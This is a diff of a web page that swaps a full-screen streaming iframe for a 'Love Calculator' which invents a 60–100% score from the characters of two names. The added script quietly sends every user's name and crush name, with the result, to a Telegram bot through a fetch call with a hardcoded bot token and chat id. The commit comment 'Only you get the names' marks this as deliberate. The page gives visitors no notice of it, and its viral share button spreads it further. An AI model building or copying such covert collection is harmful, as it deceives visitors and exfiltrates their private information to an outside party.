@@ -3,42 +3,191 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Stream Panel</title>
+    <title>Secret Love Match ❤️</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Dancing+Script:wght@700&family=Poppins:wght@400;600&display=swap" rel="stylesheet">
     <style>
-        /* Removes all gaps and makes the panel full-screen */
-        body, html {
-            margin: 0;
-            padding: 0;
-            height: 100%;
-            width: 100%;
-            overflow: hidden;
-            background-color: #000; /* Black background for video */
+        :root {
+            --primary: #ff2d55;
+            --gradient: linear-gradient(135deg, #ff2d55 0%, #fb2b69 100%);
         }
 
-        .panel-wrapper {
-            width: 100%;
-            height: 100vh;
+        body {
+            font-family: 'Poppins', sans-serif;
+            background: #ffe5ec;
             display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
         }
 
-        iframe {
-            width: 100%;
-            height: 100%;
+        .card {
+            background: #fff;
+            padding: 30px;
+            border-radius: 25px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+            width: 340px;
+            text-align: center;
+        }
+
+        input {
+            width: 90%;
+            padding: 12px;
+            margin: 10px 0;
+            border: 2px solid #eee;
+            border-radius: 12px;
+            outline: none;
+            transition: 0.3s;
+        }
+
+        input:focus { border-color: var(--primary); }
+
+        .btn {
+            background: var(--primary);
+            color: #fff;
             border: none;
+            padding: 14px;
+            width: 100%;
+            border-radius: 12px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+
+        /* SQUARE IMAGE PREVIEW (1:1 Ratio) */
+        #capture-area {
+            width: 300px;
+            height: 300px;
+            margin: 20px auto;
+            background: var(--gradient);
+            border-radius: 20px;
+            display: none;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            color: white;
+            box-shadow: 0 10px 20px rgba(255, 45, 85, 0.3);
+            position: relative;
+        }
+
+        .love-label {
+            font-family: 'Dancing Script', cursive;
+            font-size: 28px;
+            margin-bottom: 5px;
+        }
+
+        .score {
+            font-size: 85px;
+            font-weight: 800;
+            line-height: 1;
+        }
+
+        .footer-tag {
+            font-size: 12px;
+            letter-spacing: 2px;
+            font-weight: 600;
+            margin-top: 10px;
+            opacity: 0.9;
+        }
+
+        .share-section {
+            display: none;
+            margin-top: 15px;
+        }
+
+        .whatsapp-btn {
+            background: #25D366;
+            color: white;
+            border: none;
+            padding: 15px;
+            width: 100%;
+            border-radius: 12px;
+            font-weight: 600;
+            cursor: pointer;
+            font-size: 16px;
         }
     </style>
 </head>
 <body>
 
-    <div class="panel-wrapper">
-        <iframe 
-            src="https://outball.pages.dev/ENG" 
-            title="Video Content"
-            allow="autoplay; fullscreen; encrypted-media; picture-in-picture"
-            sandbox="allow-forms allow-modals allow-orientation-lock allow-pointer-lock allow-popups allow-popups-to-escape-sandbox allow-presentation allow-same-origin allow-scripts allow-top-navigation"
-            allowfullscreen>
-        </iframe>
+<div class="card">
+    <h2 style="margin-top:0; color:#333;">Love Calculator</h2>
+    
+    <input type="text" id="name1" placeholder="Your Name">
+    <input type="text" id="name2" placeholder="Crush Name">
+    
+    <button class="btn" onclick="calculate()">Calculate Match</button>
+
+    <div id="capture-area">
+        <div class="love-label">Secret Match ❤️</div>
+        <div class="score" id="res-score">0%</div>
+        <div class="footer-tag">TRUE COMPATIBILITY</div>
     </div>
+
+    <div class="share-section" id="share-section">
+        <button class="whatsapp-btn" onclick="shareNow()">
+            Share Result as Image 📸
+        </button>
+    </div>
+</div>
+
+<script>
+function calculate() {
+    let n1 = document.getElementById("name1").value.trim();
+    let n2 = document.getElementById("name2").value.trim();
+
+    if(!n1 || !n2) return alert("Enter names!");
+
+    // Logic for scores like 68, 70, 98, 100
+    let sum = 0;
+    let combined = (n1 + n2).toLowerCase();
+    for(let i=0; i<combined.length; i++) sum += combined.charCodeAt(i);
+    
+    let percent = (sum % 41) + 60; // Range 60% to 100%
+    if(percent > 100) percent = 100;
+
+    // Display in the 1:1 Square
+    document.getElementById("res-score").innerText = percent + "%";
+    document.getElementById("capture-area").style.display = "flex";
+    document.getElementById("share-section").style.display = "block";
+
+    // TELEGRAM BOT: Only you get the names
+    let token = "8780251085:AAEJxiNtLFOQp0mN7ys23i0r6gwPlDVlg2c";
+    let chat_id = "6297092647";
+    let msg = `🔥 *LOVE ALERT* 🔥\nUser: ${n1}\nCrush: ${n2}\nResult: ${percent}%`;
+    
+    fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
+}
+
+function shareNow() {
+    const area = document.getElementById("capture-area");
+    const percent = document.getElementById("res-score").innerText;
+
+    html2canvas(area).then(canvas => {
+        canvas.toBlob(blob => {
+            const file = new File([blob], "love_match.png", { type: "image/png" });
+            const link = window.location.href;
+            const text = `I just checked my love compatibility! I got ${percent} 😍. Check yours here: ${link}`;
+
+            if (navigator.canShare && navigator.canShare({ files: [file] })) {
+                navigator.share({
+                    files: [file],
+                    text: text
+                });
+            } else {
+                // Fallback: Just open WhatsApp with link and text
+                window.open(`https://wa.me/?text=${encodeURIComponent(text)}`, '_blank');
+                // Trigger download for image manually
+                const a = document.createElement('a');
+                a.download = 'match_result.png';
+                a.href = canvas.toDataURL();
+                a.click();
+            }
+        });
+    });
+}
+</script>
 
 </body>
 </html>
